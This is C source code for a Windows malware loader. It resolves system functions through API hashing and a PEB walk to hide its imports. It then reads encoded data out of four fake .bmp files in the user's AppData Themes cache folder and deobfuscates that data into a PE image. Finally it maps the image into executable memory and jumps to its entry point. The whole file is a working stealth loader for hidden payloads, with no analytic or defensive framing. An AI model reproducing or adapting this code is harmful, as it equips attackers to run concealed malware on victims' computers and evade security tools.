#include "loader.h"

char namesoffunc[20];

extern void nibbleBaseDeObfuscate(char *input, char *output);


// PE structure definitions
typedef struct _IMAGE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;


int custom_memcmp(const char *buf1, const char *buf2, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (buf1[i] != buf2[i]) {
            return -1;
        }
    }
    return 0;
}

void custom_memcpy(void *dest, const void *src, size_t len) {
    unsigned char *d = dest;
    const unsigned char *s = src;
    for (size_t i = 0; i < len; i++) {
        d[i] = s[i];
    }
}



// Function to map PE from memory buffer
HMODULE MapAndExecutePE(void* peBuffer, PFUNCTION_TABLE ft) {
    // Basic PE validation
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)peBuffer + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    
    // Get image size and allocate memory
    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    LPVOID imageBase = ft->Kernel32.VirtualAlloc(
        (LPVOID)ntHeaders->OptionalHeader.ImageBase,
        imageSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    
    // If preferred base not available, allocate anywhere
    if (!imageBase) {
        imageBase = ft->Kernel32.VirtualAlloc(
            NULL,
            imageSize,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        if (!imageBase) return NULL;
    }
    
    // Copy PE headers
    custom_memcpy(imageBase, peBuffer, ntHeaders->OptionalHeader.SizeOfHeaders);
    
    // Map sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        LPVOID sectionDest = (LPVOID)((uintptr_t)imageBase + section->VirtualAddress);
        LPVOID sectionSrc = (LPVOID)((uintptr_t)peBuffer + section->PointerToRawData);
        
        if (section->SizeOfRawData > 0) {
            custom_memcpy(sectionDest, sectionSrc, section->SizeOfRawData);
        }
    }
    
    // Fix relocations if needed
    uintptr_t delta = (uintptr_t)imageBase - ntHeaders->OptionalHeader.ImageBase;
    
    if (delta != 0 && ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(
            (uintptr_t)imageBase + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        );
        
        while (reloc->VirtualAddress > 0 && reloc->SizeOfBlock > 0) {
            DWORD entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntries = (PWORD)((uintptr_t)reloc + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < entries; i++) {
                if (relocEntries[i] >> 12 != 0) { // Valid relocation entry
                    DWORD type = relocEntries[i] >> 12;
                    DWORD offset = relocEntries[i] & 0xFFF;
                    
                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) {
                        uintptr_t* patch = (uintptr_t*)((uintptr_t)imageBase + reloc->VirtualAddress + offset);
                        *patch += delta;
                    }
                }
            }
            
            reloc = (PIMAGE_BASE_RELOCATION)((uintptr_t)reloc + reloc->SizeOfBlock);
        }
    }
    
    // // Fix imports
    // if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
    //     PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(
    //         (uintptr_t)imageBase + 
    //         ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    //     );
        
    //     while (importDesc->Name) {
    //         LPCSTR libName = (LPCSTR)((uintptr_t)imageBase + importDesc->Name);
    //         HMODULE hModule = LoadLibraryA(libName);
            
    //         if (hModule) {
    //             PIMAGE_THUNK_DATA origFirstThunk = (PIMAGE_THUNK_DATA)((uintptr_t)imageBase + importDesc->OriginalFirstThunk);
    //             PIMAGE_THUNK_DATA firstThunk = (PIMAGE_THUNK_DATA)((uintptr_t)imageBase + importDesc->FirstThunk);
                
    //             if (origFirstThunk == 0) {
    //                 origFirstThunk = firstThunk;
    //             }
                
    //             while (origFirstThunk->u1.AddressOfData) {
    //                 if (origFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
    //                     // Import by ordinal
    //                     ULONGLONG ordinal = origFirstThunk->u1.Ordinal & 0xFFFF;
    //                     firstThunk->u1.Function = (ULONGLONG)GetProcAddress(hModule, (LPCSTR)ordinal);
    //                 } else {
    //                     // Import by name
    //                     PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)(
    //                         (uintptr_t)imageBase + origFirstThunk->u1.AddressOfData
    //                     );
    //                     firstThunk->u1.Function = (ULONGLONG)GetProcAddress(hModule, importByName->Name);
    //                 }
                    
    //                 origFirstThunk++;
    //                 firstThunk++;
    //             }
    //         }
            
    //         importDesc++;
    //     }
    // }
    
    // Set page protections
    section = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, section++) {
        LPVOID sectionAddr = (LPVOID)((uintptr_t)imageBase + section->VirtualAddress);
        DWORD oldProtect;
        DWORD newProtect = 0;
        
        // Convert section characteristics to protection flags
        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (section->Characteristics & IMAGE_SCN_MEM_WRITE) {
                newProtect = PAGE_EXECUTE_READWRITE;
            } else if (section->Characteristics & IMAGE_SCN_MEM_READ) {
                newProtect = PAGE_EXECUTE_READ;
            } else {
                newProtect = PAGE_EXECUTE;
            }
        } else {
            if (section->Characteristics & IMAGE_SCN_MEM_WRITE) {
                newProtect = PAGE_READWRITE;
            } else if (section->Characteristics & IMAGE_SCN_MEM_READ) {
                newProtect = PAGE_READONLY;
            } else {
                newProtect = PAGE_NOACCESS;
            }
        }
        
        ft->Kernel32.VirtualProtect(sectionAddr, section->Misc.VirtualSize, newProtect, &oldProtect);
    }
    
    // Get entry point
    LPVOID entryPoint = (LPVOID)(
        (uintptr_t)imageBase + 
        ntHeaders->OptionalHeader.AddressOfEntryPoint
    );

   // return entry point
    return (HMODULE)entryPoint;
}




uint32_t hash_module_name_wide(const wchar_t *name) {
    uint32_t r9d = 0;

    // Determine number of bytes in each wchar_t
    size_t wchar_bytes = sizeof(wchar_t);

    // Iterate over each wide character until we hit a wide null (all bytes zero)
    for (size_t wi = 0;; ++wi) {
        wchar_t wc = name[wi];

        uint8_t bytes[4]; // enough for wchar_t up to 4 bytes
        // Copy raw representation (relies on host endianness = little-endian)
        custom_memcpy(bytes, &wc, wchar_bytes);

        // For each byte of the wchar_t (in order), run the same byte-wise
        // transform as the Python code.
        for (size_t b = 0; b < wchar_bytes; ++b) {
            uint8_t al = bytes[b];

            // lowercase ASCII -> uppercase
            if (al >= 0x61 && al <= 0x7A) {
                al -= 0x20;
            }

            uint8_t bl = al;
            al = (uint8_t)((al + al) & 0xFF); // (al + al) & 0xFF
            al ^= bl;

            r9d = (uint32_t)((r9d + (uint32_t)al) & 0xFFFFFFFFu);

            uint32_t cl = (uint32_t)(bl & 0x1F); // rotate amount (5 bits)
            if (cl != 0) {
                r9d = (uint32_t)((r9d >> cl) | (r9d << (32 - cl)));
            } else {
                // cl == 0 => rotate by 0 leaves r9d unchanged
            }
            r9d &= 0xFFFFFFFFu;
        }

        // If this wide char was the null terminator, stop now (we already processed its zero bytes).
        if (wc == (wchar_t)0) break;
    }

    return r9d;
}

uint32_t hash_module_name_ascii(const char *name) {

    wchar_t wModuleName[260];
    int i = 0;
    for(; name[i] != '\0'; i++){
        wModuleName[i] = (wchar_t)name[i];
    }
    wModuleName[i] = L'\0';

    return hash_module_name_wide(wModuleName);

}


PVOID getDefultModuleBase(DWORD HashINT){
    PTEB teb;

    asm volatile("mov %%gs:0x30, %0"
                :"=r"(teb)
    );

    PLIST_ENTRY list = &teb->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = list->Flink;

    while (current != list) {
        PCUSTOM_LDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, CUSTOM_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if(hash_module_name_wide(entry->BaseDllName.Buffer) == HashINT){
            //wprintf(L"%ls\n", entry->BaseDllName.Buffer);
            return entry->DllBase;
        }

        current = current->Flink;
    }

}

PVOID getFunctionBase(DWORD HashINT,PVOID ModuleBase) {

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE*)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ModuleBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    char* moduleName = (char*)ModuleBase + exportDirectory->Name;


    DWORD* names = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNames);
    DWORD* functions = (DWORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)ModuleBase + exportDirectory->AddressOfNameOrdinals);
    
    
    for(DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)ModuleBase + names[i];
        if(hash_module_name_ascii(moduleName) + hash_module_name_ascii(functionName) == HashINT){
            custom_memcpy(namesoffunc, functionName, 15);
            namesoffunc[15] = '\0';

            //printf("Found function: %s\n", functionName);
            DWORD functionRVA = functions[ordinals[i]];
            return (PVOID)((BYTE*)ModuleBase + functionRVA);
        }
    }

}


/* Compute encoded block size based on first 2 bytes */
static inline int get_block_size(const unsigned char *in) {
    int mode = in[0];
    int meta = in[1];
    return 2 + meta + 25 + (mode ? 50 : 25);
}

/* Read a file into memory using WinAPI, skipping BMP header */
DWORD ReadFileSkipHeader(LPCSTR path, LPBYTE buffer, DWORD offset, DWORD maxRead, DWORD skip, PFUNCTION_TABLE ft) {
    HANDLE hFile = ft->Kernel32.CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    // Move file pointer to skip BMP header
    if (ft->Kernel32.SetFilePointer(hFile, skip, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        ft->Kernel32.CloseHandle(hFile);
        return 0;
    }

    DWORD bytesRead = 0;
    if (!ft->Kernel32.ReadFile(hFile, buffer + offset, maxRead, &bytesRead, NULL)) {
        ft->Kernel32.CloseHandle(hFile);
        return 0;
    }

    ft->Kernel32.CloseHandle(hFile);
    return bytesRead;
}

/* Decode encoded_data[] and execute */
int decode_to_file(char filename[4][512], LPCSTR username, PFUNCTION_TABLE ft) {
    LPVOID encoded_data = ft->Kernel32.VirtualAlloc(NULL, 1024 * 30, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!encoded_data) return -1;
    LPVOID decoded_data = ft->Kernel32.VirtualAlloc(NULL, 1024 * 30, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decoded_data) return -1;

    DWORD total_size = 0;
    for (int i = 0; i < 4; i++) {
        DWORD readBytes = ReadFileSkipHeader(filename[i], (LPBYTE)encoded_data, total_size, 0x1680, 0x36, ft);
        if (readBytes == 0) {
            ft->Kernel32.VirtualFree(encoded_data, 0, MEM_RELEASE);
            ft->Kernel32.VirtualFree(decoded_data, 0, MEM_RELEASE);
            return -2;
        }
        total_size += readBytes;
    }

    total_size = 19733;

    DWORD pos = 0;
    DWORD out_pos = 0;
    unsigned char block[512];
    unsigned char decoded[512];

    while (pos + 2 <= total_size) {
        int block_size = get_block_size((BYTE*)encoded_data + pos);
        if (pos + block_size > total_size)
            break;

        custom_memcpy(block, (BYTE*)encoded_data + pos, block_size);
        nibbleBaseDeObfuscate((char*)block, (char*)decoded);

        custom_memcpy((BYTE*)decoded_data + out_pos, decoded, 50);
        out_pos += 50;

        pos += block_size;
    }
    
    ft->Kernel32.VirtualFree(encoded_data, 0, MEM_RELEASE);

    

    // Execute the decoded PE
    HMODULE entryPoint = MapAndExecutePE(decoded_data, ft);
    ft->Kernel32.VirtualFree(decoded_data, 0, MEM_RELEASE);
    if (!entryPoint) {
        return -1;
    }
    // Execute the entry point
    void (*payload)(void) = (void (*)())entryPoint;
    payload();

    

    ft->Kernel32.VirtualFree(decoded_data, 0, MEM_RELEASE);

    return 0;
}

int __main() {


    

    // Initialize function table
    FUNCTION_TABLE functionTable;

    // setup KERNEL32 functions
    PVOID kernel32Base = getDefultModuleBase(0xA690026B); // hash of "KERNEL32.DLL"
    functionTable.Kernel32.LoadLibraryA = getFunctionBase(0xA70F2B3C, kernel32Base); // hash of "KERNEL32.DLL" + "LoadLibraryA"
    functionTable.Kernel32.CloseHandle = getFunctionBase(0x2D020480, kernel32Base); // hash of "KERNEL32.DLL" + "CloseHandle"
    functionTable.Kernel32.VirtualProtect = getFunctionBase(0x06FD1396, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualProtect"
    functionTable.Kernel32.VirtualAlloc = getFunctionBase(0x9C7BFF01, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualAlloc"
    functionTable.Kernel32.VirtualFree = getFunctionBase(0x81C26E14, kernel32Base); // hash of "KERNEL32.DLL" + "VirtualFree"

    functionTable.Kernel32.ReadFile = getFunctionBase(0x2ABA496E, kernel32Base); // hash of "KERNEL32.DLL" + "ReadFile"
    functionTable.Kernel32.CreateFileA = getFunctionBase(0x9F091EC6, kernel32Base); // hash of "KERNEL32.DLL" + "CreateFileA"
    functionTable.Kernel32.GetFileSize = getFunctionBase(0x08DC1E1D, kernel32Base); // hash of "KERNEL32.DLL" + "GetFileSize"
    functionTable.Kernel32.SetFilePointer = getFunctionBase(0xCA9D39A2, kernel32Base); // hash of "KERNEL32.DLL" + "SetFilePointer"

    PVOID winhttpBase = functionTable.Kernel32.LoadLibraryA("advapi32.dll");
    functionTable.Advapi32.GetUserNameA = getFunctionBase(0x777AAFF8, winhttpBase); // hash of "KERNEL32.DLL" + "GetUserNameA"

    // Test the resolved functions
    PFUNCTION_TABLE ft = &functionTable;





    char username[256];
    DWORD size = sizeof(username);

    if (!ft->Advapi32.GetUserNameA(username, &size)) {
        return 1;
    }

    char filename[4][512];

    const char *suffix[4] = {
        "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\cache\\cc3a26f5b4243c012f4c5d7cac5f4edf.bmp",
        "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\cache\\d41d8cd98f00b204e9800998ecf8427e.bmp",
        "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\cache\\e4d909c290d0fb1ca068ff2f2bda6f0e.bmp",
        "\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\cache\\45c48cce2e2d7fbdea1afc51c7c6ad26.bmp"
    };

    for (int i = 0; i < 4; i++) {
        custom_memcpy(filename[i], "C:\\Users\\", 9);
        custom_memcpy(filename[i] + 9, username, size - 1);
        custom_memcpy(filename[i] + 8 + size, suffix[i], 85);
        filename[i][9 + size + 85] = '\0';
    }
    

    if (decode_to_file(filename, username, ft) != 0) {
        return 1;
    }

    return 0;
}
